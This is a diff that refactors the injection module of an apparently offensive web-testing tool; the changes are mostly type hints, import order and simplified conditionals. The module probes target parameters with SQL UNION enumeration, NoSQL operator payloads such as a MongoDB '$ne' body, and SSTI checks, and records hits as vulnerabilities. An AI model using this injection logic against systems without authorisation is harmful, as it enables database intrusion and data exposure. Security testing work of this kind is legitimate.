@@ -4,13 +4,13 @@ from __future__ import annotations
 
 import re
 import time
-from typing import Any, Dict, List, Optional
+from typing import Any
 
-from sentinel.models import AttackResult, EngagementSession
+from sentinel.data import NOSQL_PAYLOADS, SQLI_PAYLOADS_BASIC, SQLI_PAYLOADS_BLIND, SSTI_PAYLOADS
 from sentinel.logger import log
+from sentinel.models import AttackResult, EngagementSession
 from sentinel.modules.base import BaseModule
 from sentinel.utils.http import request
-from sentinel.data import SQLI_PAYLOADS_BASIC, SQLI_PAYLOADS_BLIND, NOSQL_PAYLOADS, SSTI_PAYLOADS
 
 
 class InjectModule(BaseModule):
@@ -18,12 +18,12 @@ class InjectModule(BaseModule):
 
     name = "inject"
 
-    def run(self, es: EngagementSession, **kwargs: object) -> List[AttackResult]:
+    def run(self, es: EngagementSession, **kwargs: object) -> list[AttackResult]:
         target_url: str = kwargs.get("target_url", "")  # type: ignore[assignment]
-        params_to_test: Optional[List[str]] = kwargs.get("params_to_test")  # type: ignore[assignment]
-        post_body: Optional[Dict[str, Any]] = kwargs.get("post_body")  # type: ignore[assignment]
+        params_to_test: list[str] | None = kwargs.get("params_to_test")  # type: ignore[assignment]
+        post_body: dict[str, Any] | None = kwargs.get("post_body")  # type: ignore[assignment]
 
-        results: List[AttackResult] = []
+        results: list[AttackResult] = []
         url = target_url or es.base_url
         test_params = params_to_test or ["id", "name", "user", "search", "q", "query", "username", "email", "filter", "sort"]
 
@@ -33,13 +33,8 @@ class InjectModule(BaseModule):
         return results
 
     def _sql_inject(self, es: EngagementSession, url: str,
-                    params: List[str], post_body: Optional[Dict] = None) -> List[AttackResult]:
-        results: List[AttackResult] = []
-
-        # Get baseline
-        baseline_resp = request(es, "GET", url)
-        baseline_body = baseline_resp.text if baseline_resp else ""
-        baseline_time = 0.0
+                    params: list[str], post_body: dict | None = None) -> list[AttackResult]:
+        results: list[AttackResult] = []
 
         for param in params:
             # Error-based / boolean detection
@@ -102,7 +97,7 @@ class InjectModule(BaseModule):
         return results
 
     def _union_extract(self, es: EngagementSession, url: str,
-                       param: str, base_payload: str) -> Optional[AttackResult]:
+                       param: str, base_payload: str) -> AttackResult | None:
         # Determine number of columns with NULL padding
         for col_count in range(1, 10):
             nulls = ",".join(["NULL"] * col_count)
@@ -137,8 +132,8 @@ class InjectModule(BaseModule):
         return None
 
     def _nosql_inject(self, es: EngagementSession, url: str,
-                      params: List[str], post_body: Optional[Dict] = None) -> List[AttackResult]:
-        results: List[AttackResult] = []
+                      params: list[str], post_body: dict | None = None) -> list[AttackResult]:
+        results: list[AttackResult] = []
         baseline_resp = request(es, "GET", url, params={params[0]: "legit_value"} if params else {})
         baseline_body = baseline_resp.text if baseline_resp else ""
 
@@ -146,36 +141,36 @@ class InjectModule(BaseModule):
         for param in params[:5]:
             for payload in NOSQL_PAYLOADS[:4]:
                 resp = request(es, "GET", url, params={param: payload})
-                if resp and resp.text != baseline_body and resp.status_code == 200:
-                    # Check if response returned more data than baseline
-                    if len(resp.text) > len(baseline_body) * 1.5:
-                        log(f"[Inject/NoSQL] Potential NoSQL injection! param={param}", "CRIT")
-                        results.append(AttackResult(
-                            "inject", "nosql_operator", "VULN",
-                            url=url, payload=f"{param}={payload}",
-                            evidence=resp.text[:200], severity="HIGH",
-                            notes=f"NoSQL operator injection in '{param}' — response size increased significantly",
-                        ))
-                        break
+                # Flag payloads that return significantly more data than baseline
+                if (resp and resp.text != baseline_body and resp.status_code == 200
+                        and len(resp.text) > len(baseline_body) * 1.5):
+                    log(f"[Inject/NoSQL] Potential NoSQL injection! param={param}", "CRIT")
+                    results.append(AttackResult(
+                        "inject", "nosql_operator", "VULN",
+                        url=url, payload=f"{param}={payload}",
+                        evidence=resp.text[:200], severity="HIGH",
+                        notes=f"NoSQL operator injection in '{param}' — response size increased significantly",
+                    ))
+                    break
 
         # POST JSON injection (MongoDB)
         if post_body:
             for key in post_body:
                 test_body = {**post_body, key: {"$ne": None}}
                 resp = request(es, "POST", url, json=test_body)
-                if resp and resp.status_code == 200:
-                    if len(resp.text) > 20 and resp.text != baseline_body:
-                        results.append(AttackResult(
-                            "inject", "nosql_json_operator", "VULN",
-                            url=url, payload=f'{key}: {{"$ne": null}}',
-                            evidence=resp.text[:200], severity="HIGH",
-                            notes="MongoDB operator injection via JSON POST body",
-                        ))
+                if (resp and resp.status_code == 200
+                        and len(resp.text) > 20 and resp.text != baseline_body):
+                    results.append(AttackResult(
+                        "inject", "nosql_json_operator", "VULN",
+                        url=url, payload=f'{key}: {{"$ne": null}}',
+                        evidence=resp.text[:200], severity="HIGH",
+                        notes="MongoDB operator injection via JSON POST body",
+                    ))
         return results
 
     def _ssti_detect(self, es: EngagementSession, url: str,
-                     params: List[str], post_body: Optional[Dict] = None) -> List[AttackResult]:
-        results: List[AttackResult] = []
+                     params: list[str], post_body: dict | None = None) -> list[AttackResult]:
+        results: list[AttackResult] = []
         for param in params[:5]:
             for payload, expected in SSTI_PAYLOADS[:4]:
                 resp = request(es, "GET", url, params={param: payload})
